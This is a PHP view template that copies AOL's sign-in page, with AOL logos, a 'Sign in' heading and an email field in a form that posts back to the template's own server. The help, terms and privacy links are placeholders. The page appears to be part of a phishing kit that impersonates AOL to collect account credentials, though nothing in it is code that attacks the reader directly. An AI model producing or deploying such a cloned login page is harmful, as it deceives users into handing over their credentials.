<?php $this->view('componets/LoginHeader');?>
<body class="Aol_body_sec">
    <div class="mbr-desktop-hd">
        <span class="column">
            <a href="<?=ROOT?>">
                <img src="<?=ASSETS?>images/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="">
                <img src="<?=ASSETS?>images/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo " width="100" height="">
            </a>
        </span>
        <span class="column help txt-align-right">
            <a href="#">Help</a>
        </span>
    </div>
        <div class="Aol-Page">
            <div class="login-sec">
                <div class="mbr-login-hd txt-align-center">
                    <img src="<?=ASSETS?>images/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-GB" width="100" height="">
                    <img src="<?=ASSETS?>images/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-GB" width="100" height="">
                </div> 
                <div class="challenge-header"></div>
                <strong class="challenge-heading">Sign&nbsp;in</strong>
                <span class="challenge-desc">&nbsp;</span>
                <form method="POST" class="form-group" id="AolLogin" autocomplete="off">
                    <div class="wrap-input100 validate-input" data-validate="Valid email is: a@b.c"> 
                        <input class="input100" type="text" name="email"> 
                        <span class="bbb-input" data-placeholder="Username, email address or mobile number"></span> 
                    </div>
                    <div class="login-container-form-btn">
                        <div class="button-row d-flex mt-4">
                            <button class="ml-auto aol-btn width-50 ml-auto" type="button">Next</button>
                        </div>
                    </div>
                    <div class="helper-links-container">
                        <div class="helper-item ">
                            <span class="stay-signed-in checkbox-container">
                                <label class="persistent" for="persistent" >
                                    <input id="persistent" name="persistent" value="y" type="checkbox">
                                    Stay signed&nbsp;in
                                </label>
                            </span>
                        </div>
                        <div class="helper-item arlink">
                            <span class="help">
                                <a href="#" id="mbr-forgot-link"  data-rapid-tracking="true">Forgotten&nbsp;username?</a>
                            </span>
                        </div>
                    </div>
                    <div class="login-container-form-btn">
                        <div class="button-row d-flex mt-4">
                            <a href="javascript:voidd(0)">
                            <button class="ml-auto aol-Create-new width-50 ml-auto" type="button">Create new account</button></a>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        <div class="login-footer">
            <p><a href="#" target="_blank" class="terms">Terms</a>
                <span>|</span>
                <a href="#" target="_blank" class="privacy">Privacy</a>
            </p>
        </div>
</body>
</html>